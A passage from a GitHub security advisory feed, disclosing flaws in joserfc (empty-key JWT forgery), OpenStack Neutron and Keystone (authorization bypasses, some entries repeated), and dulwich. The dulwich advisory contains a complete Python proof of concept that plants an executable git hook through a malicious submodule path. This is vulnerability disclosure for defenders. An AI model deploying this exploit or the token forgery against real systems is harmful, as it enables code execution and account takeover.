<td><code>JWT_SECRET</code> unset (== "")</td>
<td>HTTP 200, <code>admin=True</code> (verified)</td>
<td>HTTP 401</td>
</tr>
<tr>
<td><code>JWT_SECRET</code> = 256-bit value</td>
<td>HTTP 401, <code>BadSignatureError</code></td>
<td>HTTP 401</td>
</tr>
</tbody></table>
<p>The first row demonstrates that an attacker with zero knowledge of the
verification secret reaches the protected path by signing with the empty
key. The second row confirms the verifier behaves correctly when the
secret is non-empty, proving the bug is gated only on the secret being
empty rather than on any structural defect in the attacker's token.</p>
<p>Fix verification: with the suggested empty-key reject wired into
<code>HMACAlgorithm.sign</code> / <code>.verify</code>, the empty-secret server re-run rejects
the same forged token with <code>ValueError: HMAC key must not be empty</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Complete authentication bypass on any service whose key finder resolves
to <code>""</code> / <code>None</code> (env var unset, DB row missing, fallback). Attacker
forges arbitrary claims (<code>sub</code>, <code>admin</code>, scopes, audience, expiry).</li>
<li>The misconfiguration that triggers the bug is silent: the server does
not fail to boot, joserfc emits a single <code>SecurityWarning</code> ("Key size
should be &gt;= 112 bits") at <code>OctKey.import_key</code> time and then proceeds.</li>
<li>Severity matches the parent (ruby-jwt CVE-2026-45363, CVSS 7.4 high).
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N — AC:H because of the
operator-misconfiguration precondition; impact otherwise matches
authentication bypass.</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Upgrade the existing <code>&lt; 14 bytes</code> warning in <code>OctKey.import_key</code> to a hard
reject at <code>len(key.raw_value) == 0</code>, plus a defence-in-depth check in
<code>HMACAlgorithm.sign</code> and <code>HMACAlgorithm.verify</code> after
<code>key.get_op_key(...)</code>:</p>
<pre><code class="language-python"># src/joserfc/_rfc7518/oct_key.py
@classmethod
def import_key(cls, value, parameters=None, password=None) -&gt; "OctKey":
    key: OctKey = super(OctKey, cls).import_key(value, parameters, password)
    if not key.raw_value:
        raise ValueError("oct key material must not be empty")
    if len(key.raw_value) &lt; 14:
        warnings.warn("Key size should be &gt;= 112 bits", SecurityWarning)
    return key

# src/joserfc/_rfc7518/jws_algs.py
class HMACAlgorithm(JWSAlgModel):
    ...
    def sign(self, msg: bytes, key: OctKey) -&gt; bytes:
        op_key = key.get_op_key("sign")
        if not op_key:
            raise ValueError("HMAC key must not be empty")
        return hmac.new(op_key, msg, self.hash_alg).digest()

    def verify(self, msg: bytes, sig: bytes, key: OctKey) -&gt; bool:
        op_key = key.get_op_key("verify")
        if not op_key:
            raise ValueError("HMAC key must not be empty")
        v_sig = hmac.new(op_key, msg, self.hash_alg).digest()
        return hmac.compare_digest(sig, v_sig)
</code></pre>
<p>The two-layer fix mirrors PyJWT 2.13.0's approach (reject empty in
<code>prepare_key</code>, plus the runtime length checks the underlying hmac
primitive does not perform).</p>
<h3 id="fix-pr">Fix PR</h3>
<p><code>authlib/joserfc-ghsa-gg9x-qcx2-xmrh#1</code> (temp private fork PR), branch
<code>fix/hmac-reject-empty-key</code>, base <code>main</code>. URL:
<a href="https://github.com/authlib/joserfc-ghsa-gg9x-qcx2-xmrh/pull/1">https://github.com/authlib/joserfc-ghsa-gg9x-qcx2-xmrh/pull/1</a></p>
<h3 id="credit">Credit</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/joserfc/security/advisories/GHSA-gg9x-qcx2-xmrh">https://github.com/authlib/joserfc/security/advisories/GHSA-gg9x-qcx2-xmrh</a></li>
<li><a href="https://github.com/authlib/joserfc/commit/86d00910b2b2d2d07503fee9b572906daefab7f1">https://github.com/authlib/joserfc/commit/86d00910b2b2d2d07503fee9b572906daefab7f1</a></li>
<li><a href="https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70">https://github.com/authlib/joserfc/blob/1ddca8f3c73ff47e3bc3ac06cb0c08a9535677ec/src/joserfc/_rfc7518/jws_algs.py#L62-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-gg9x-qcx2-xmrh">https://github.com/advisories/GHSA-gg9x-qcx2-xmrh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gg9x-qcx2-xmrh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T19:12:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich's submodule path traversal in porcelain.submodule_update / porcelain.clone(recurse_submodules=True) yields RCE via attacker-dropped .git/hooks payload]]></title>
        <id>https://github.com/advisories/GHSA-gfhv-vqv2-4544</id>
        <link href="https://github.com/advisories/GHSA-gfhv-vqv2-4544"/>
        <updated>2026-07-02T17:50:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>dulwich.porcelain.submodule_update</code>, and by extension <code>porcelain.clone(..., recurse_submodules=True)</code>, materializes attacker-controlled submodule paths from a crafted upstream repository without path validation. A malicious <code>.gitmodules</code> plus a matching tree gitlink whose <code>path</code> is <code>.git/hooks</code> (or any other directory inside the parent repository's <code>.git</code> directory) causes the attacker's submodule tree contents to be written directly into the victim's <code>.git/hooks/</code> directory, preserving executable mode bits. The dropped executables are then run by any subsequent <code>git</code> or <code>dulwich</code> command that invokes the matching hook, resulting in arbitrary code execution.</p>
<p>This is the dulwich equivalent of the upstream Git fixes for CVE-2024-32002 / CVE-2024-32004, which were never propagated into dulwich's separately implemented submodule porcelain.</p>
<h3 id="affected">Affected</h3>
<ul>
<li><strong>Package:</strong> <code>dulwich</code> (PyPI)</li>
<li><strong>Affected versions:</strong> <code>&gt;=0.23.2, &lt;1.2.5</code></li>
<li><strong>Affected platforms:</strong> all (Linux, macOS, Windows). Exploitation does not require a case-insensitive or NTFS filesystem, because the path written is a literal <code>.git/hooks</code> rather than a case- or short-name-aliased form.</li>
</ul>
<p>Affected entry points:</p>
<ul>
<li><code>dulwich.porcelain.submodule_update(repo, init=True, recursive=True)</code></li>
<li><code>dulwich.porcelain.clone(source, target, recurse_submodules=True)</code></li>
<li><code>dulwich submodule update</code> CLI / <code>dulwich clone --recurse-submodules</code> CLI</li>
</ul>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p>The submodule path from the tree's gitlink entry (and matching <code>.gitmodules</code>) is consumed without validation in <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234"><code>dulwich/porcelain/submodule.py</code></a>.</p>
<p>The attacker-controlled <code>path</code> enters the loop from <code>iter_cached_submodules</code> (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L168"><code>submodule.py#L154-L168</code></a>):</p>
<pre><code class="language-python">for path, target_sha in submodules_to_update:
    path_str = (
        path.decode(DEFAULT_ENCODING) if isinstance(path, bytes) else path
    )

    submodule_name: bytes | None = None
    for sm_path, sm_url, sm_name in read_submodules(gitmodules_path):
        if sm_path == path:
            submodule_name = sm_name
            break

    if not submodule_name:
        continue
</code></pre>
<p>It flows unchecked into <code>os.path.join</code> and the filesystem (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L187-L188"><code>submodule.py#L187-L188</code></a>):</p>
<pre><code class="language-python">            submodule_path = os.path.join(r.path, path_str)
            submodule_git_dir = os.path.join(r.controldir(), "modules", path_str)
</code></pre>
<p>Finally, the attacker tree's contents are materialized into that directory via <code>build_index_from_tree</code> with no <code>validate_path_element</code> argument, defaulting to the lax validator (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L229-L234"><code>submodule.py#L229-L234</code></a>):</p>
<pre><code class="language-python">                    build_index_from_tree(
                        submodule_path,
                        sub_repo.index_path(),
                        sub_repo.object_store,
                        tree_id,
                    )
</code></pre>
<p>Three issues compound:</p>
<ol>
<li><code>path_str</code> originates from the parent repository's tree gitlink entry (attacker-controlled) and is never validated against <code>.git</code>, <code>..</code>, or other path-traversal patterns. The same value is read from the attacker-supplied <code>.gitmodules</code> blob via <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/config.py#L1637-L1665"><code>read_submodules</code></a>, which also performs no validation.</li>
<li><code>submodule_path = os.path.join(r.path, path_str)</code> therefore resolves to an attacker-chosen directory anywhere on disk (e.g. <code>&lt;worktree&gt;/.git/hooks</code>).</li>
<li><a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/index.py#L2034-L2044"><code>build_index_from_tree</code></a> is called without <code>validate_path_element</code>, so it defaults to <code>validate_path_element_default</code>, which only rejects literal <code>.git</code>, <code>.</code>, and <code>..</code>. It does not refuse a <code>root_path</code> that is itself inside the parent's <code>.git</code> directory, and it honors the attacker tree's file modes including executable bits (<code>0o100755</code>).</li>
</ol>
<h3 id="reachability">Reachability</h3>
<p>A direct production call path from a user invocation: <code>porcelain.clone(source, target, recurse_submodules=True)</code> at <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/__init__.py#L1548-L1551"><code>dulwich/porcelain/__init__.py:1548-1551</code></a> calls <code>submodule_update(repo, init=True, recursive=True)</code> once the parent clone completes, reaching the unsanitized loop at <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234"><code>submodule.py#L154-L234</code></a>.</p>
<p>The CLI command <code>dulwich clone --recurse-submodules &lt;url&gt;</code> reaches the same sink via <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/cli.py#L2131"><code>dulwich/cli.py:2131</code></a>.</p>
<p>Any service that exposes <code>porcelain.clone(..., recurse_submodules=True)</code> on attacker-supplied URLs is exposed: CI runners, repository import tools, package resolvers that use dulwich as a pure-Python git, and language-server "fetch dependency from git" features.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>End-to-end against pip-installed <code>dulwich==1.2.4</code>, demonstrating both the path-traversal primitive and the resulting code execution when the victim subsequently runs <code>git</code>. The payload writes a marker file rather than performing any destructive action.</p>
<pre><code class="language-python">import os, tempfile, subprocess
import dulwich.repo as r
import dulwich.porcelain as p
from dulwich.objects import Blob, Commit, Tree

WORKDIR = tempfile.mkdtemp(prefix="dulwich-poc-")
ATTACKER = os.path.join(WORKDIR, "att.git")
VICTIM_PARENT = os.path.join(WORKDIR, "vic_parent.git")
VICTIM_WT = os.path.join(WORKDIR, "vic_wt")
MARKER = os.path.join(WORKDIR, "marker")

# Attacker submodule contains a single file named "post-checkout"
# with mode 0755 and a benign shell payload that writes a marker file.
attacker = r.Repo.init_bare(ATTACKER, mkdir=True)
payload = b"#!/bin/sh\necho executed &gt; " + MARKER.encode() + b"\n"
pb = Blob.from_string(payload)
attacker.object_store.add_object(pb)
at = Tree()
at.add(b"post-checkout", 0o100755, pb.id)
attacker.object_store.add_object(at)
ac = Commit()
ac.tree = at.id
ac.author = ac.committer = b"a &lt;a@a&gt;"
ac.author_time = ac.commit_time = 0
ac.author_timezone = ac.commit_timezone = 0
ac.message = b"x"
attacker.object_store.add_object(ac)
attacker.refs[b"refs/heads/master"] = ac.id
attacker.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Victim parent has a .gitmodules and a tree gitlink, both pointing at
# path ".git/hooks". The gitlink targets the attacker submodule commit.
victim = r.Repo.init_bare(VICTIM_PARENT, mkdir=True)
gitmod = (
    b'[submodule "evil"]\n'
    b'\tpath = .git/hooks\n'
    b'\turl = ' + ATTACKER.encode() + b'\n'
)
gmb = Blob.from_string(gitmod)
victim.object_store.add_object(gmb)
vt = Tree()
vt.add(b".gitmodules", 0o100644, gmb.id)
vt.add(b".git/hooks", 0o160000, ac.id)
victim.object_store.add_object(vt)
vc = Commit()
vc.tree = vt.id
vc.author = vc.committer = b"a &lt;a@a&gt;"
vc.author_time = vc.commit_time = 0
vc.author_timezone = vc.commit_timezone = 0
vc.message = b"v"
victim.object_store.add_object(vc)
victim.refs[b"refs/heads/master"] = vc.id
victim.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Single victim call: clone with recurse_submodules=True
p.clone(VICTIM_PARENT, VICTIM_WT, recurse_submodules=True)

hook = os.path.join(VICTIM_WT, ".git", "hooks", "post-checkout")
assert os.path.exists(hook), "hook was not written"
assert os.stat(hook).st_mode &amp; 0o111, "hook is not executable"

# git running in the victim worktree then executes the dropped hook
subprocess.run(["git", "-C", VICTIM_WT, "checkout", "master"], check=True,
               capture_output=True)
assert os.path.exists(MARKER), "hook did not fire"
print("Code execution confirmed:", open(MARKER).read().strip())
</code></pre>
<p>The trigger surface is broader than this proof of concept: the dropped file fires for any matching hook name (<code>post-checkout</code>, <code>pre-commit</code>, <code>post-merge</code>, <code>post-rewrite</code>, <code>post-applypatch</code>, and others). dulwich itself executes several hooks (<code>pre-commit</code>, <code>commit-msg</code>, <code>post-commit</code>, <code>pre-receive</code>, <code>update</code>, <code>post-receive</code>; see <code>dulwich/hooks.py</code> and <code>dulwich/repo.py</code>), so a victim using only dulwich is also reachable without upstream Git.</p>
<h3 id="credit">Credit</h3>
<p>tonghuaroot</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544">https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52726">https://nvd.nist.gov/vuln/detail/CVE-2026-52726</a></li>
<li><a href="https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5">https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5</a></li>
<li><a href="https://github.com/advisories/GHSA-gfhv-vqv2-4544">https://github.com/advisories/GHSA-gfhv-vqv2-4544</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfhv-vqv2-4544</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:50:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
